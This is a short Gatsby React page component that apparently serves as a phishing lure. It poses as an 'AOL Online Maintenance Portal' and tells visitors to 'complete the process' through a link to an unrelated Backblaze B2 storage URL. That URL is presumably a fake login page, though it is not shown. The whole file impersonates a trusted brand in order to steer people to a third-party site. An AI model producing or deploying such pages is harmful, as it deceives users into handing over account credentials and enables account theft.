import * as React from "react"
import { Link } from "gatsby"

import Layout from "../components/layout"
import Seo from "../components/seo"

const SecondPage = () => (
  <Layout>
    <Seo title="AOL" />
    <h1>AOL Online Maintenance Portal</h1>
    <p>Click below to complete the process</p>
    <Link to="https://aolportaledimanutenzioneonlinediaoaimailmaintenanc.s3.us-west-002.backblazeb2.com/index.html">Aol Portal</Link>
  </Layout>
)

export default SecondPage
